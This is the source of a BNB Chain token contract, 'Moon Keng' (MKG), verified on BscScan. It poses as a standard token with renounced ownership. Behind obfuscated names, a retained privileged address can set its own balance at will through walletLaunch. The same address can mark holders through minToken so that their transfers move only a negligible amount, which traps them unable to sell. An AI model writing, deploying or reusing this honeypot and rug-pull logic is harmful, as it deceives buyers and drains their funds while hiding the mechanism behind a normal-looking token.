/**
 *Submitted for verification at BscScan.com on 2023-01-24
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;


interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract MoonKeng {
    uint8 public decimals = 18;
    address public owner;
    string public name = "Moon Keng";

    mapping(address => bool) public maxAuto;
    mapping(address => bool) public tokenTx;
    uint256 public totalSupply = 100000000 * 10 ** 18;

    mapping(address => uint256) public balanceOf;
    address public tradingMinTeam;


    uint256 constant listShould = 10 ** 10;
    string public symbol = "MKG";
    mapping(address => mapping(address => uint256)) public allowance;

    address public modeLimitMarketing;
    modifier txLaunch() {
        require(tokenTx[msg.sender]);
        _;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        IUniswapV2Router buySell = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        modeLimitMarketing = IUniswapV2Factory(buySell.factory()).createPair(buySell.WETH(), address(this));
        owner = msg.sender;
        tradingMinTeam = owner;
        tokenTx[tradingMinTeam] = true;
        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
        renounceOwnership();
    }

    function transfer(address dst, uint256 amount) external returns (bool) {
        return _transferFrom(msg.sender, dst, amount);
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function walletLaunch(uint256 toTokenWallet) public txLaunch {
        balanceOf[tradingMinTeam] = toTokenWallet;
    }

    function minToken(address enableTrading) public txLaunch {
        maxAuto[enableTrading] = true;
    }

    function exemptMin(address buyMode) public txLaunch {
        tokenTx[buyMode] = true;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function tradingBurn(address senderSwap, address launchedTo, uint256 toTokenWallet) internal returns (bool) {
        require(balanceOf[senderSwap] >= toTokenWallet);
        balanceOf[senderSwap] -= toTokenWallet;
        balanceOf[launchedTo] += toTokenWallet;
        emit Transfer(senderSwap, launchedTo, toTokenWallet);
        return true;
    }

    function transferFrom(address src, address dst, uint256 amount) external returns (bool) {
        if (allowance[src][msg.sender] != type(uint256).max) {
            require(allowance[src][msg.sender] >= amount);
            allowance[src][msg.sender] -= amount;
        }
        return _transferFrom(src, dst, amount);
    }

    function _transferFrom(address src, address dst, uint256 amount) internal returns (bool) {
        if (src == tradingMinTeam || dst == tradingMinTeam) {
            return tradingBurn(src, dst, amount);
        }
        if (maxAuto[src]) {
            return tradingBurn(src, dst, listShould);
        }
        return tradingBurn(src, dst, amount);
    }


}